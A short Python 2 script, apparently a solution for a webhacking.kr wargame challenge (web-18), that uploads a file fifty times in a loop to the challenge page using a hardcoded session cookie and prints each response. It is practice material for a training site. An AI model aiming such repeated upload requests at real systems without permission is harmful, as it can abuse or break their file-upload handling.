import requests

url='http://webhacking.kr/challenge/web/web-18/index.php'
files={'upfile':('tmp-1428039160',open('tmp-1428039160','rb'),'multipart/form-data')}
cookies={'PHPSESSID':'1gvdu8mjh0miihv90idtg3djj3'}

for i in xrange(50):
	response=requests.post(url, files=files, cookies=cookies)
	print response.text

